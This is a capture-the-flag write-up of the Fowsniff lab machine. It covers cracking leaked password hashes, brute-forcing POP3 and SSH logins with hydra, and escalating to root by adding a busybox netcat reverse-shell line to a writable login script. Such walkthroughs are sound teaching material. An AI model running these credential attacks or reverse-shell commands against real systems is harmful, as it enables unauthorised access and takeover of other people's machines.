# Fowsniff CTF

### Fowsniff CTF
Nmap scan finds ports 22,80,110 and 143 open.<br />
Enumerating the webpage, it's unavailable because of a databreach. Following the questions provided in the task, I found the [following link](https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt) that contains emails and hashed passwords of the employees!:<br />
![image](https://github.com/user-attachments/assets/8e264b24-a4e5-4f17-8b78-3913e3420f4d)<br />
Using crackstation I cracked most of them:<br />
![image](https://github.com/user-attachments/assets/e43c2bbe-28f0-4a72-bd1c-24fd7fa07dc5)<br />
I copied these users and passwords into local files, and used `hydra -L users.txt -P pass.txt -f 10.10.171.182 pop3` to check for valid credentials. I found the password for the user `seina`.<br />
I can now log in with netcat on port 110 and read emails with the following commands:<br />
![image](https://github.com/user-attachments/assets/b1d6f09a-1074-405a-9d4b-92932d36000b)<br />
The email contains the following message:<br />
![image](https://github.com/user-attachments/assets/a86a074a-1996-45a0-aafc-4c6bde547a4f)<br />
To find a valid user with that password, I run `hydra -L users.txt -p REDACTED_PASSWORD -f 10.10.171.182 ssh`. And I'm able to log in as user `baksteen`. After some system enumeration, I found a bash file inside `/opt/cube`:<br />
![image](https://github.com/user-attachments/assets/6c50e571-a522-43ac-b4d7-3a8dbceace01)<br />
This file gets executed by the user `parede` every time a user logs in (since it's the same banner I got after logging with baksteen). This file is writable by the `users` group, me included. So I change it and added `busybox nc my_IP my_PORT -e sh`, then logged out and in again with baksteen, and got a reverse root shell! Apparenlty that script gets executed by root, not parede.


